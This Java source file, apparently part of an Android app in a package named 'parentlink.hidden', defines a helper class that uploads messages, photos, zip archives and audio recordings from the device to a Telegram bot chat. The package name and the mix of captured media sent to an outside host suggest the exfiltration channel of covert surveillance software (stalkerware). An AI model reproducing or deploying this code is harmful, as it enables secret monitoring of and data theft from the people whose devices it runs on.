package com.parentlink.hidden;

import okhttp3.*;
import java.io.File;
import java.io.IOException;

public class TelegramBotHelper {
    private static String botToken;
    private static String chatId;
    private static OkHttpClient client = new OkHttpClient();
    
    public static void init(String token, String id) {
        botToken = token;
        chatId = id;
    }
    
    public static void sendMessageToBot(String message) {
        if (botToken == null || chatId == null) return;
        
        String url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        String body = "chat_id=" + chatId + "&text=" + message;
        
        Request request = new Request.Builder()
            .url(url)
            .post(RequestBody.create(body, MediaType.parse("application/x-www-form-urlencoded")))
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) { response.close(); }
        });
    }
    
    public static void sendSingleImage(String imagePath, String caption) {
        if (botToken == null || chatId == null) return;
        
        File imageFile = new File(imagePath);
        if (!imageFile.exists()) return;
        
        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", imageFile.getName(),
                RequestBody.create(imageFile, MediaType.parse("image/jpeg")))
            .addFormDataPart("caption", caption)
            .build();
        
        Request request = new Request.Builder()
            .url("https://api.telegram.org/bot" + botToken + "/sendPhoto")
            .post(body)
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) { response.close(); }
        });
    }
    
    public static void sendZipFile(String zipPath, String caption) {
        if (botToken == null || chatId == null) return;
        
        File zipFile = new File(zipPath);
        if (!zipFile.exists()) return;
        
        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", zipFile.getName(),
                RequestBody.create(zipFile, MediaType.parse("application/zip")))
            .addFormDataPart("caption", caption)
            .build();
        
        Request request = new Request.Builder()
            .url("https://api.telegram.org/bot" + botToken + "/sendDocument")
            .post(body)
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) { response.close(); }
        });
    }
    
    public static void sendAudioFile(String audioPath, String caption) {
        if (botToken == null || chatId == null) return;
        
        File audioFile = new File(audioPath);
        if (!audioFile.exists()) return;
        
        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("audio", audioFile.getName(),
                RequestBody.create(audioFile, MediaType.parse("audio/3gpp")))
            .addFormDataPart("caption", caption)
            .build();
        
        Request request = new Request.Builder()
            .url("https://api.telegram.org/bot" + botToken + "/sendAudio")
            .post(body)
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) { response.close(); }
        });
    }
}